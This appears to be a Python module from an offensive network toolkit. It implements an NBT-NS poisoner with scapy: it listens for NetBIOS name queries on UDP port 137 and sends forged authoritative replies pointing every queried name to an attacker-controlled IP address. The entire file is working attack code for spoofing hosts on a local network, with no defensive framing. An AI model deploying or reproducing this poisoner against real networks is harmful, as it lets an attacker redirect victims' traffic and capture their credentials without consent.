from scapy.all import *
from scapy.layers.netbios import NBNSQueryRequest, NBNSQueryResponse, NBNSResourceRecord
from netph.utils.logger import logger
import threading

class NBNSPoisoner:
    def __init__(self, interface: str, spoof_ip: str):
        self.interface = interface
        self.spoof_ip = spoof_ip
        self.running = False
        self._thread = None

    def _handle_packet(self, packet: Packet):
        if packet.haslayer(UDP) and packet[UDP].dport == 137:
            if packet.haslayer(NBNSQueryRequest) and packet[NBNSQueryRequest].FLAGS == 0x0110: # Query
                query_name = packet[NBNSQueryRequest].QUESTION_NAME.decode().rstrip()
                logger.info(f"[NBT-NS] Received query for: {query_name} from {packet[IP].src}")
                
                # Craft response
                resp = IP(dst=packet[IP].src, src=self.spoof_ip) / \
                       UDP(dport=packet[UDP].sport, sport=137) / \
                       NBNSQueryResponse(
                           NAME_TRN_ID=packet[NBNSQueryRequest].NAME_TRN_ID,
                           FLAGS=0x8500, # Response, Authoritative, Success
                           QDCOUNT=0,
                           ANCOUNT=1,
                           NSCOUNT=0,
                           ARCOUNT=0,
                           ADDR_ENTRY=[NBNSResourceRecord(
                               RR_NAME=packet[NBNSQueryRequest].QUESTION_NAME,
                               SUFFIX=packet[NBNSQueryRequest].SUFFIX,
                               NB_FLAGS=0x0000,
                               ADDR=self.spoof_ip
                           )]
                       )
                
                send(resp, iface=self.interface, verbose=False)
                logger.info(f"[NBT-NS] Sent spoofed response for {query_name} to {packet[IP].src}")

    def start(self):
        self.running = True
        logger.info(f"[NBT-NS] Starting poisoner on {self.interface}...")
        self._thread = threading.Thread(target=self._run)
        self._thread.daemon = True
        self._thread.start()

    def _run(self):
        sniff(iface=self.interface, filter="udp port 137", prn=self._handle_packet, store=0, stop_filter=lambda x: not self.running)

    def stop(self):
        self.running = False
        if self._thread:
            self._thread.join()
        logger.info("[NBT-NS] Stopped poisoner.")

